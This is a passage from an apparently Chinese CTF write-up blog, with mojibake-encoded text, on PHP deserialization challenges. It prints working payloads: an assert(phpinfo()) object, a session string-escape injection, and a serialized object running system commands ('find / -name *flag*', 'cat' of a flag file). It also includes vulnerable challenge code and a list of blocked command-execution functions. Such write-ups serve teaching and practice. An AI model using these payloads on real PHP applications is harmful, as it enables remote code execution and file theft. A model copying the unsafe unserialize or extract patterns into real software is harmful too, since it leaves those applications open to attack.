class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">22</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">24</span></span></code></pre><p>ç®€å•çš„ååºåˆ—åŒ–</p><p><code>__destruct</code>æ–¹æ³•åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘ï¼Œé‡Œé¢çš„<code>$b($a)</code>å³ä½œä¸ºä»£ç æ‰§è¡Œçš„æ¡ä»¶ï¼Œäºæ˜¯å¯ä»¥æ„é€ <code>assert(phpinfo())</code>ï¼Œ<code>payload</code>å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo()'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"assert"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å°†ç»“æœä¼ å…¥<code>data</code>æœç´¢flagå³å¯å¾—åˆ°flag</p><h3 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="å®‰æ´µæ¯-2019-easy_serialize_php"></a>å®‰æ´µæ¯-2019-easy_serialize_php</h3><p>é¢˜ç›®ç»™å‡ºäº†æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="../index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åœ¨ä»¤<code>$function == &#39;phpinfo&#39;</code>æ—¶æŸ¥çœ‹<code>phpinfo()</code>å†…å®¹å‘ç°å­˜åœ¨<code>d0g3_f1ag.php</code> æ–‡ä»¶ï¼Œæ¨æµ‹flagåœ¨å…¶ä¸­ï¼Œäºæ˜¯æƒ³åŠæ³•æ„é€ æ–‡ä»¶è¯»å–æ–¹æ³•</p><p>ä¸éš¾çœ‹åˆ°ä»£ç ä¸­æœ‰ä¸€ä¸ª<code>extract()</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¦‚æœæ²¡è®¾ç½®<code>extract_rules</code>ä¸º<code>EXTR_SKIP</code> åˆ™ä¼šè¦†ç›–åŸæœ‰å˜é‡</p><ul><li><strong>extract()</strong>ï¼š å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚<a href="https://www.php.net/manual/zh/function.extract.php">å‚è€ƒ</a></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200515135141013.png" alt loading="lazy"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚æœæƒ³è¦è¯»å–<code>d0g3_f1ag.php</code>æ–‡ä»¶çš„å†…å®¹å°±éœ€è¦ä»¤ååºåˆ—åŒ–åçš„<code>$_SESSION[&#39;img&#39;]</code>ä¸º<code>d0g3_f1ag.php  =&gt;  ZDBnM19mMWFnLnBocA==</code>åˆ™åˆæ­¥ååºåˆ—åŒ–å†…å®¹<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>å†çœ‹åˆ°<code>$serialize_info = filter(serialize($_SESSION));</code>ï¼Œå…ˆç»è¿‡åºåˆ—åŒ–ï¼Œç„¶ååœ¨è¿›è¡Œ<code>filter</code>å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤æ›¿æ¢æ“ä½œï¼Œè¿™æ ·çš„è¯å°±å¾ˆæœ‰å¯èƒ½ä¼šé€ æˆåºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸çš„é—®é¢˜ï¼Œäºæ˜¯æ„é€ åˆ©ç”¨payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagphpphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ç”±äº<code>_SESSION</code>æ•°ç»„æœ‰3ä¸ªå€¼ï¼Œåˆ™éœ€è¦åœ¨åé¢è¡¥å……éšä¾¿ä¸€ä¸ªå€¼å³å¯</p><p>ä¼ å…¥å<code>$serialize_info</code>çš„å°±ä¸ºä»¥ä¸‹å€¼</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string double-quoted-string">";&#125; "</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>user</code>é—­åˆ<code>&quot;;s:8:&quot;function&quot;;s:34:</code>ï¼Œéšåå†è¯»å–<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>ï¼Œéšåå¤§æ‹¬å·é—­åˆï¼Œåé¢çš„<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>å€¼ä¸¢å¼ƒ</p><p>è¯»å–åˆ°<code>d0g3_f1ag.php</code> å†…å®¹ä¸º</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag in /d0g3_fllllllag'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å†ä¾æ³•è¯»å–<code>/d0g3_fllllllag</code>å³å¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagphpphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"L2QwZzNfZmxsbGxsbGFn"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h3><p>é¢˜ç›®æ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šè‡ªåŠ¨å‘ä¸€ä¸ªåŒ…åˆ·æ–°ä¸€ä¸‹ç½‘é¡µï¼ŒæŠ“åŒ…ä¸‹æ¥çœ‹çœ‹å‘æ¥äº†å•¥æ•°æ®</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625154555825.png" alt loading="lazy"></p><p>æµ‹è¯•åæŠ¥é”™å¾—åˆ°å‡½æ•°è°ƒç”¨äº†<code>call_user_func()</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ•°æ®åŒ…è°ƒç”¨äº†dateå‡½æ•°ï¼Œä¼ å…¥äº†åé¢ä¸ºpçš„å‚æ•°ï¼Œå¹¶ä¸”æ‰§è¡Œäº†å‡½æ•°è¾“å‡ºäº†ç»“æœ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155114637.png" alt loading="lazy"></p><p>äºæ˜¯ç”¨<code>system</code>å‡½æ•°æµ‹è¯•å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155200767.png" alt loading="lazy"></p><p>è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯ç›´æ¥å°†<code>index.php</code>çš„æºç è¯»å–å‡ºæ¥(è¯»æ ¹ç›®å½•æ²¡æœ‰flag)ï¼Œ<code>func=readfile&amp;p=index.php</code>ï¼Œå¾—åˆ°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æœä¸å…¶ç„¶è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œç”¨çš„<code>in_array</code>å‡½æ•°è¿›è¡Œå¯¹æ¯”ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æ”¹å‡½æ•°çš„<code>Test</code>æ–¹æ³•ï¼Œé‡Œé¢ä¹Ÿè°ƒç”¨äº†<code>gettime</code>æ–¹æ³•ï¼Œäºæ˜¯æ„é€ ååºåˆ—åŒ–åˆ©ç”¨</p><p>expï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"find / -name *flag*"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"find / -name *flag*"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä¼ å…¥æ‰¾åˆ°flagæ‰€åœ¨çš„æ–‡ä»¶</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155712200.png" alt loading="lazy"></p><p>å°è¯•è¯»å–</p><pre class="language-php" data-language="php"><code class="language-php">func<span class="token operator">=</span>unserialize<span class="token operator">&amp;</span>p<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cat /tmp/flagoefiu4r93"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¾—åˆ°flag</p><h3 id="2020-ç¬¬å››å±Š-å¼ºç½‘æ¯-webè¾…åŠ©"><a href="#2020-ç¬¬å››å±Š-å¼ºç½‘æ¯-webè¾…åŠ©" class="headerlink" title="[2020 ç¬¬å››å±Š å¼ºç½‘æ¯]-webè¾…åŠ©"></a>[2020 ç¬¬å››å±Š å¼ºç½‘æ¯]-webè¾…åŠ©</h3><p>é¢˜ç›®ç»™å‡ºäº†æºç 